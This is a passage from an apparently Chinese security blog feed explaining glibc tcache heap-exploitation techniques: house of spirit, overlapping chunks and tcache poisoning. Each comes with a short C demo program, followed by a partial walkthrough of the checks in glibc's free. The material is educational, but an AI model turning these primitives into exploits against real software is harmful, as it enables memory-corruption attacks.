class="string">"stack buf: %p\n"</span>, (<span class="keyword">void</span> *)fake_chunk_and_more);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>* fake_chunk = (<span class="keyword">char</span> * )fake_chunk_and_more;</span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> *)(fake_chunk + <span class="number">0x110</span> + <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x40</span>;  <span class="comment">// 设置 pre_inused 位</span></span><br><span class="line">    <span class="keyword">char</span> *mem = fake_chunk + <span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100) returned: %p\n"</span>, mem2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是在栈上面（用栈只是为了方便）伪造了 一个 <code>0x110</code> 大小 <code>chunk</code>，</p><p>然后把它释放掉，他就会进入 <code>tcache</code> ,然后分配 <code>0x110</code> 的 <code>chunk</code> 就可以 分配到 <code>fake_chunk_and_more</code> 的地址</p><p>可以看到分配到了<code>fake_chunk_and_more</code> .</p><p>调试过程的内存状态</p><p>熟悉 <code>malloc</code> 管理机制的老哥们可以比较奇怪，这里把 <code>next_chunk-&gt;pre_inused = 0</code> ( <code>size = 0x40</code> ) 。</p><p>在 源码里面是有通过 <code>check_inuse_chunk</code> 检测是否 <code>double free</code> 的 代码的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  ....................................................</span><br><span class="line">  ....................................................</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是从 <code>ida</code> 里面去看，居然不见了，校验 <code>chunk</code> 的 <code>size</code> 和 指针 后就直接进入 <code>tcache</code> 的处理的流程， 于是这里就算设置 下一个<code>chunk</code> 的 <code>next_chunk-&gt;pre_inuse = 0</code> ,也不会出现 <code>crash</code> 。</p><h2 id="overlapping-chunks-by-caching"><a href="#overlapping-chunks-by-caching" class="headerlink" title="overlapping_chunks_by_caching"></a>overlapping_chunks_by_caching</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p><code>overlapping_chunks</code> 这种技术非常经典了， 不过在 <code>tcache</code> 里面就非常的简单了， 修改 <code>chunk</code> 的 <code>size</code> 为 <code>fake_size</code> ， 然后 <code>free</code> 掉它，就会进入 <code>fake_size</code> 对应的 <code>tcache</code> ， 然后在 分配 <code>fake_size</code> 的 <code>chunk</code> 就可以拿到这个 <code>chunk</code> , <strong>overlap chunk</strong></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *sentry = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sentry, <span class="string">'b'</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem: %p, sentry: %p\n"</span>,mem, sentry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    *(<span class="keyword">long</span>* )(mem - <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) = <span class="number">0x110</span>;  <span class="comment">// 设置 chunk-&gt;size = 0x110</span></span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">// 分配一个 0x110 的chunk</span></span><br><span class="line">    <span class="built_in">memset</span>(mem2, <span class="string">'a'</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"sentry content: %s\n"</span>, sentry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过修改 <code>mem</code> 所在 <code>chunk</code> 的 <code>size</code> 为 <code>0x110</code></p><p>然后释放掉他 ，然后分配一个 <code>0x110</code> 的 <code>chunk</code> ，我们就会再次分配到它。此时 <code>mem2</code> 的 <code>chunk</code> 包含了 <code>sentry</code> 的 <code>chunk</code></p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>通过修改 <code>free</code> 状态的 <code>tcache</code> 里面的 <code>chunk</code> 的 <code>fd</code> （其实就是 <code>tcache_entry-&gt;next</code> ) ，可以分配到任意地址</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> target[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack: %p\n"</span>,target);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">free</span>(mem);</span><br><span class="line">    *(<span class="keyword">long</span> *)(mem) = (<span class="keyword">long</span>)target; </span><br><span class="line">    <span class="keyword">char</span> *mem1 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem2 = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mem2: %p\n"</span>, mem2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一个 <code>0x50</code> 的 <code>chunk</code> 然后释放它，进入 <code>tcache</code> ，然后修改 <code>fd</code> 为 <code>target</code></p><p>然后分配两次 <code>0x50</code> 的 <code>chunk</code> 就可以分配到 <code>target</code></p><p>成功分配到了 栈上面。</p><p>其实 <code>fd</code> 为任意地址都行，原因在于 <code>tcache_get</code> 直接从 <code>tcache-&gt;entries</code> 里面拿 <code>chunk</code> ， 而不检查 拿到的 <code>chunk</code> 是否合法。</p><p>同时 在 <code>malloc</code> 分配内存时，首先使用 <code>tcache</code> ，而它判断 <code>tcache</code> 有没有可以分配的 <code>chunk</code> , 是直接判断指定项有没有指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 根据tcache-&gt;entries[tc_idx]是否为空判断是否有chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p><code>tcache</code> 的引入使得 <code>heap</code> 相关的漏洞的利用非常的简单了。</p><p>简单的原因主要在于 <code>tcache</code> 里面没有做什么检查， 同时还会优先使用这使得原来 <code>malloc</code> 里面的 <code>check</code> 也没有了作用。</p><p><code>free</code> 的话 释放内存如果大小在 <code>tcache</code> 的范围内， 只检测 <strong>size 和 指针</strong> 是否合法，而且检测非常弱。</p><p><code>malloc</code> 时 也是优先使用 <code>tcache</code> ， 只要 <code>tcache-&gt;entries[tc_idx]</code> 非空就可以从 <code>tcache</code> 分配。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="http://tukan.farm/2017/07/08/tcache/" target="_blank" rel="noopener">http://tukan.farm/2017/07/08/tcache/</a></p><p><a href="https://www.anquanke.com/post/id/104760" target="_blank" rel="noopener">https://www.anquanke.com/post/id/104760</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416796.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9416796.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;code&gt;glibc 2.26&lt;/code&gt; 开始引入了 &lt;code&gt;tcache&lt;/code&gt; , 相关的 commit 可以看&lt;br&gt;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>free源码简单分析</title>
    <link href="https://nocbtm.github.io/2020/02/26/free%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/02/26/free源码简单分析/</id>
    <published>2020-02-26T11:14:51.000Z</published>
    <updated>2020-04-07T03:39:47.606Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GI-libc-free"><a href="#GI-libc-free" class="headerlink" title="_GI___libc_free"></a>_GI___libc_free</h2><p>首先是 _GI___libc_free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __fastcall _GI___libc_free(<span class="keyword">void</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _free_hook )</span><br><span class="line">  &#123;</span><br><span class="line">    _free_hook(ptr, retaddr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (<span class="keyword">unsigned</span> __int64)ptr - <span class="number">16</span>;</span><br><span class="line">    v2 = *((_QWORD *)ptr - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &amp; <span class="number">2</span> )                               <span class="comment">// 判断size位，判断是不是 mmap 获得的 chunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !mp_.no_dyn_threshold</span><br><span class="line">        &amp;&amp; v2 &gt; mp_.mmap_threshold</span><br><span class="line">        &amp;&amp; v2 &lt;= <span class="number">0x2000000</span></span><br><span class="line">        &amp;&amp; (v1 &lt; (<span class="keyword">unsigned</span> __int64)dumped_main_arena_start || v1 &gt;= (<span class="keyword">unsigned</span> __int64)dumped_main_arena_end) )</span><br><span class="line">      &#123;</span><br><span class="line">        mp_.mmap_threshold = v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL;</span><br><span class="line">        mp_.trim_threshold = <span class="number">2</span> * (v2 &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL);</span><br><span class="line">      &#125;</span><br><span class="line">      munmap_chunk((mchunkptr)((<span class="keyword">char</span> *)ptr - <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      av = &amp;main_arena;</span><br><span class="line">      <span class="keyword">if</span> ( v2 &amp; <span class="number">4</span> )</span><br><span class="line">        av = *(malloc_state **)(v1 &amp; <span class="number">0xFFFFFFFFFC000000</span>LL);</span><br><span class="line">      int_free(av, (mchunkptr)v1, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在 free_hook ， 就会直接调用 free_hook(ptr) 然后返回。否则判断被 free 的 内存是否是 mmap 获取的 ，如果是则使用 munmap_chunk 回收内存，否则进入 _int_free</p><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>首先会做一些简单的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检查指针是否正常，对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid pointer"</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 size 是否 &gt;= MINSIZE ，且是否对齐</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">"free(): invalid size"</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查 chunk 是否处于 inuse 状态</span></span><br><span class="line">  check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><p>检查</p><ul><li>指针是否对齐</li><li>块的大小是否对齐，且大于最小的大小</li><li>块是否在 inuse 状态</li></ul><h2 id="进入-fastbin"><a href="#进入-fastbin" class="headerlink" title="进入 fastbin"></a>进入 fastbin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())) &#123;</span><br><span class="line">    <span class="keyword">if</span> (have_lock</span><br><span class="line">        || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">          mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">          locked = <span class="number">1</span>;</span><br><span class="line">          chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ <span class="comment">// next-&gt;size &lt;= 2 * SIZE_SZ</span></span><br><span class="line">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; <span class="comment">// </span></span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">      old_idx = fastbin_index(chunksize(old));</span><br><span class="line">    p-&gt;fd = old2 = old; <span class="comment">// 插入 fastbin</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果 size 满足 fastbin 的条件，则首先判断 next_chunk-&gt;size 要满足</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">next_chunk-&gt;size &gt; <span class="number">2</span> * SIZE_SZ</span><br><span class="line">next_chunk-&gt;size &lt; av-&gt;system_mem</span><br></pre></td></tr></table></figure><p>接着就会找对相应的 fastbin ，然后插入 该 bin 的第一项。插入前有一个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>就是 p-&gt;size 索引到的 fastbin 的第一个指针不能和当前的 p 相同，否则会被认为是 double free</p><h2 id="进入-Unsorted-bin"><a href="#进入-Unsorted-bin" class="headerlink" title="进入 Unsorted bin"></a>进入 Unsorted bin</h2><p>如果被 free 的这个块不是 通过 mmap 获得的，就会进入下面的逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="keyword">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 得到下一个 chunk 的指针</span></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不能 free top chunk</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (top)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="comment">// nextchunk 不能越界，就是限制了 p-&gt;size</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">              &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">              &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">    errstr = <span class="string">"double free or corruption (out)"</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/*p 要被标识为 inuse 状态 */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"double free or corruption (!prev)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="comment">// nextsize 在  [ 2 * SIZE_SZ, av-&gt;system_mem] 之间</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">"free(): invalid next size (normal)"</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果 p的前一个块是 free 状态，就向前合并，通过 p-&gt;pre_inused 判断*/</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      